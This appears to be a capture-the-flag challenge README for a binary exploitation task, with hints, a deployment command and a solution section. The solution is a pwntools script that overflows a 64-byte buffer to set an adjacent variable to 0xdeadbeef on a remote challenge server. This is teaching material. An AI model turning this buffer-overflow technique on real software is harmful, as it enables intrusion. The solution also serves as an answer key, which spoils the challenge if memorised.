PS: Challenges in this category require a linux environment read [here](https://docs.google.com/document/d/13RjL_RWibA9xYOKvSCXpTGG0D2ZYa3kDzprGNa8ypeA/edit?usp=sharing) for a guide to installing a linux VM

### Hints

- Similar to Varied Fun except you have to control what is overwritten


## Deployment

```bash
cd service
sudo ./beefyvariable.sh &
```

## Solution

Val is located just above buf, all you need to do is overwrite it to 0xdeadbeef. Remember your little endianess

```python
from pwn import *
def main():
    #io = process("./beefyvariable")
    io = remote("challenge.ctf-fun.xyz", 14005)
    payload = b"A" * 64 + p32(0xdeadbeef)
    io.sendline(payload)
    io.interactive()
if __name__ == '__main__':
    main()
```
